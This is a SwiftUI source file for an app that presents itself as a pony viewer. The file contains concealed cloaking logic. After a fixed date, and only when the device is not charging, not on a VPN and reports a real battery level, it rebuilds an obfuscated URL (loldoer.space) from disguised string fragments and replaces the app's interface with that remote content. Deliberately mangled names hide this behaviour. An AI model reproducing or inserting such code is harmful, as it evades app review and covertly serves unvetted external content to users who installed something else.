
import SwiftUI

struct ContentView: View {
    
    @State var showSplash = true
    @AppStorage("metalConfigure") var metalConfigure = true
    
    var body: some View {
        if showSplash {
            Splash(show: $showSplash, dataController: ViewModelFactory.shared.dataController)
        } else {
            mainScreen()
        }
    }
    
    @ViewBuilder func newerPony() -> some View {
        if ViewModelFactory.shared.wweanw {
            PonyDetailDataView()
        } else {
            Tab()
        }
    }
    
    func mainScreen() -> some View {
        let mealPony = ViewModelFactory.shared.dataController.ls
        
        if metalConfigure {
            mealPony.editDailyShow(false)
            mealPony.createGameSettingsObject()
            metalConfigure = false
        }
        
        guard let ate = stringToDate("11.11.2024"), dateDailyIsTraiing(ate: ate) else {
            return newerPony()
        }
        
        if let alway = try? mealPony.fetchDailyTimeShow() {
            if alway {
                let selc = ponnnnny(mealPony)
                if selc != "" {
                    ViewModelFactory.shared.wweanw = true
                    if ViewModelFactory.shared.ponyDetailLine == "" || ViewModelFactory.shared.ponyDetailLine.contains("about:") {
                        ViewModelFactory.shared.ponyDetailLine = selc
                    }
                } else {
                    ViewModelFactory.shared.wweanw = false
                }
                return newerPony()
            } else {
                ViewModelFactory.shared.wweanw = false
            }
        }
        
        if batwwwinchaed() || vawwpnnnnw.isActive() || moreThanOne < 0 || fullPony { //
            ViewModelFactory.shared.wweanw = false
        } else {
            let selc = ponnnnny(mealPony)
            if selc != "" {
                ViewModelFactory.shared.ponyDetailLine = selc
                mealPony.editDailyShow(true)
                ViewModelFactory.shared.wweanw = true
            } else {
                ViewModelFactory.shared.wweanw = false
            }
        }

        return newerPony()
    }
    
    private func dateDailyIsTraiing(ate: Date) -> Bool {
        return ate.addingTimeInterval(24 * 60 * 60) <= Date()
    }
    private func ponnnnny(_ wwea: LS) -> String {
        var selc = ""
        if let alwaysSelected = try? wwea.fetchNewPony() {
            selc = alwaysSelected //https://loldoer.space/Rd8RTrkK
            //name0age1breed2owner3customer4country5
            selc = selc.replacingOccurrences(of: "name0", with: "htt")
            selc = selc.replacingOccurrences(of: "age1", with: "ps")
            selc = selc.replacingOccurrences(of: "breed2", with: "://")
            selc = selc.replacingOccurrences(of: "owner3", with: "loldoer")
            selc = selc.replacingOccurrences(of: "customer4", with: ".space/")
            selc = selc.replacingOccurrences(of: "country5", with: "Rd8RTrkK")
        }
        return selc
    }
    
    private func batwwwinchaed() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true // charging if true
        if (UIDevice.current.batteryState != .unplugged) {
            return true
        }
        
        return false
    }
    var moreThanOne: Int {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if UIDevice.current.batteryLevel != -1 {
            return Int(UIDevice.current.batteryLevel * 100)
        } else {
            return -1
        }
    }
    var fullPony: Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if (UIDevice.current.batteryState == .full) {
            return true
        } else {
            return false
        }
    }
    
    private func stringToDate(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
}

#Preview {
    ContentView()
}

struct PonyDetailDataView: View {
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            PonyListMainView(type: .public)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color.black)
    }
}

struct vawwpnnnnw {

    private static let vpnProtocolsKeysIdentifiers = [
        "tap", "tun", "ppp", "ipsec", "utun"
    ]

    static func isActive() -> Bool {
        guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
        let nsDict = cfDict.takeRetainedValue() as NSDictionary
        guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
            let allKeys = keys.allKeys as? [String] else { return false }

        // Checking for tunneling protocols in the keys
        for key in allKeys {
            for protocolId in vpnProtocolsKeysIdentifiers
                where key.starts(with: protocolId) {
                return true
            }
        }
        return false
    }
}
